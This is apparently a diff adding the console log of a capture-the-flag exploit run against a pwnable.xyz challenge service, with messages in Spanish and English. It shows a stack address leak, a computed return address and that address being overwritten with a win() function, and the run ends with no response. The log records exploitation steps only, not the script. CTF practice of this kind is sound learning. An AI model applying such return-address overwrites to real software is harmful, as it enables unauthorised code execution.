@@ -1,0 +1,13 @@
+[*] Conectando al servidor remoto...
+[x] Opening connection to svc.pwnable.xyz on port 30005
+[x] Opening connection to svc.pwnable.xyz on port 30005: Trying 134.209.56.140
+[+] Opening connection to svc.pwnable.xyz on port 30005: Done
+[*] Stack leak (heap_ptr_addr): 0x7ffff8fe21d0
+[*] Calculated ret_addr: 0x7ffff8fe2228
+[+] heap_ptr ahora apunta a ret_addr
+[+] ret_addr sobrescrito con win() = 0x400a3e
+[x] Receiving all data
+[x] Receiving all data: 0B
+[+] Receiving all data: Done (0B)
+[*] Closed connection to svc.pwnable.xyz port 30005
+[!] No se recibió respuesta
